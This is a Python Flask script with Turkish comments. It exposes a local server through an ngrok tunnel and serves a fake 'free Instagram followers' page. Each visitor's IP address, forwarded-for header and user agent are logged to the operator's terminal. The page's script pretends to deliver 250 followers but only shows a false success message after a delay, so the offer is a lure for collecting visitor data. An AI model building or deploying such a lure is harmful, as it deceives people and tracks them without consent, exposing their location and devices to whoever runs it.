from flask import Flask, render_template, request
import datetime
import subprocess
import sys
import os
import webbrowser
from pyngrok import ngrok, conf

app = Flask(__name__)

def check_ngrok_installed():
    """Sistemde ngrok kurulu mu kontrol et"""
    try:
        # ngrok versiyonunu kontrol et
        result = subprocess.run(['ngrok', '--version'], 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        if result.returncode == 0:
            print(f"✅ Ngrok kurulu: {result.stdout.strip()}")
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        pass
    
    # pyngrok ile de kontrol et
    try:
        ngrok_version = ngrok.get_ngrok_version()
        print(f"✅ Pyngrok üzerinden ngrok kurulu: {ngrok_version}")
        return True
    except Exception as e:
        print(f"❌ Ngrok kurulu değil: {e}")
        return False

def install_ngrok_warning():
    """Ngrok kurulum uyarısı göster"""
    print("\n" + "🔧" * 50)
    print("🚨 NGROK KURULU DEĞİL!")
    print("🔧" * 50)
    print("Ngrok'u kurmak için aşağıdaki seçeneklerden birini kullanın:")
    print("\n1. Otomatik Kurulum (Önerilen):")
    print("   https://github.com/Dogankayax/Ngrok-kurulum")
    print("\n2. Manuel Kurulum:")
    print("   - https://ngrok.com/download adresinden indirin")
    print("   - Zip dosyasını açıp ngrok'u PATH'e ekleyin")
    print("   - Veya: pip install pyngrok")
    print("\n3. Pyngrok ile otomatik indirme:")
    print("   from pyngrok import ngrok")
    print("   # Bu otomatik olarak ngrok'u indirecektir")
    print("🔧" * 50)
    
    # Kullanıcıya kurulum linkini açmayı teklif et
    try:
        response = input("\nKurulum sayfasını açmak istiyor musunuz? (e/h): ").lower()
        if response in ['e', 'evet', 'y', 'yes']:
            webbrowser.open("https://github.com/Dogankayax/Ngrok-kurulum")
            print("📁 Tarayıcı açılıyor...")
    except:
        pass
    
    return False

def setup_ngrok_tunnel():
    """Ngrok tüneli kur"""
    try:
        # Ngrok region ayarı (daha hızlı bağlantı için)
        conf.get_default().region = "eu"
        
        # Tüneli aç
        public_url = ngrok.connect(5000, bind_tls=True)
        
        # Tünel bilgilerini al
        tunnels = ngrok.get_tunnels()
        
        print("\n🌐" + "="*50)
        print("✅ NGROK TÜNELİ BAŞARIYLA AÇILDI!")
        print("="*50)
        print(f"📱 Public URL: {public_url}")
        print(f"🔗 Local URL: http://localhost:5000")
        
        for tunnel in tunnels:
            print(f"📡 Tunnel: {tunnel.public_url} -> {tunnel.config['addr']}")
        
        print("="*50)
        
        return public_url
        
    except Exception as e:
        print(f"❌ Ngrok tüneli açılamadı: {e}")
        return None

# Uygulama başlangıcında ngrok kontrolü
print("🔍 Sistem kontrolü yapılıyor...")

if not check_ngrok_installed():
    if not install_ngrok_warning():
        print("\n⚠️ Ngrok kurulumu tamamlanana kadar bekleniyor...")
        print("Lütfen ngrok'u kurduktan sonra programı yeniden başlatın.")
        sys.exit(1)

# Ngrok tünelini kur
public_url = setup_ngrok_tunnel()

if not public_url:
    print("❌ Ngrok başlatılamadı. Localhost üzerinden devam ediliyor...")
    public_url = "http://localhost:5000"

@app.route('/')
def index():
    # IP bilgilerini al
    ip_methods = {
        'remote_addr': request.remote_addr,
        'x_forwarded_for': request.headers.get('X-Forwarded-For'),
        'x_real_ip': request.headers.get('X-Real-IP'),
        'host': request.host.split(':')[0],
        'user_agent': request.headers.get('User-Agent'),
        'ngrok_url': str(public_url) if public_url else "Localhost"
    }
    
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Terminale yazdır
    print("\n" + "🚀" * 25)
    print("🆕 YENİ ZİYARETÇİ!")
    print("🚀" * 25)
    print(f"📅 Tarih: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🌐 Public URL: {public_url}")
    print(f"📱 Gerçek IP: {real_ip}")
    print(f"🖥️ User Agent: {ip_methods['user_agent']}")
    print(f"🔗 X-Forwarded-For: {ip_methods['x_forwarded_for']}")
    print("🚀" * 25)
    
    # HTML template
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Takipçi Hilesi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ 
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }}
            .container {{
                background: white;
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                text-align: center;
                max-width: 500px;
                width: 100%;
            }}
            .logo {{ font-size: 3rem; margin-bottom: 20px; }}
            h1 {{ color: #333; margin-bottom: 20px; }}
            .info {{ 
                background: #f8f9fa; 
                padding: 15px; 
                border-radius: 8px;
                margin: 20px 0;
                text-align: left;
            }}
            .ip-info {{ color: #E1306C; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">📱</div>
            <h1>ÜCRETSİZ İNSTAGRAM TAKİPÇİ</h1>
            
            <div class="info">
                <h3>🌐 Site Bilgileri:</h3>
                <p><strong>Public URL:</strong> {public_url}</p>
                <p><strong>IP Adresiniz:</strong> <span class="ip-info">{real_ip}</span></p>
            </div>
            
            <div class="input-group">
                <input type="text" id="username" placeholder="Instagram kullanıcı adınız" 
                       style="width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px;">
            </div>
            
            <button onclick="getFollowers()" 
                    style="width: 100%; padding: 15px; background: linear-gradient(45deg, #E1306C, #F77737); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer;">
                250 TAKİPÇİ KAZAN
            </button>
            
            <div id="message" style="margin-top: 20px; padding: 15px; border-radius: 8px; display: none;"></div>
        </div>

        <script>
            function getFollowers() {{
                const username = document.getElementById('username').value.trim();
                const message = document.getElementById('message');
                const button = document.querySelector('button');
                
                if (!username) {{
                    showMessage('Lütfen kullanıcı adınızı girin!', 'error');
                    return;
                }}
                
                // Butonu devre dışı bırak
                button.disabled = true;
                button.textContent = 'İŞLEM YAPILIYOR...';
                
                // Loading mesajı
                showMessage('⏳ Lütfen bekleyiniz... İşleminiz gerçekleşiyor', 'loading');
                
                // 5 saniye bekle
                setTimeout(() => {{
                    showMessage('✅ 250 takipçi hesabınıza başarıyla aktarıldı!', 'success');
                    document.getElementById('username').value = '';
                    button.disabled = false;
                    button.textContent = '250 TAKİPÇİ KAZAN';
                }}, 5000);
            }}
            
            function showMessage(text, type) {{
                const message = document.getElementById('message');
                message.textContent = text;
                message.style.display = 'block';
                
                // Renkleri ayarla
                if (type === 'error') {{
                    message.style.background = '#f8d7da';
                    message.style.color = '#721c24';
                    message.style.border = '1px solid #f5c6cb';
                }} else if (type === 'loading') {{
                    message.style.background = '#fff3cd';
                    message.style.color = '#856404';
                    message.style.border = '1px solid #ffeaa7';
                }} else if (type === 'success') {{
                    message.style.background = '#d4edda';
                    message.style.color = '#155724';
                    message.style.border = '1px solid #c3e6cb';
                }}
            }}
            
            // Enter tuşu desteği
            document.getElementById('username').addEventListener('keypress', function(e) {{
                if (e.key === 'Enter') {{
                    getFollowers();
                }}
            }});
        </script>
    </body>
    </html>
    '''
    
    return html_content

if __name__ == '__main__':
    print(f"\n🚀 Flask sunucusu başlatılıyor...")
    print(f"📡 Ngrok URL: {public_url}")
    print(f"🔗 Yerel URL: http://localhost:5000")
    print("⏳ Ziyaretçileri bekliyorum...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)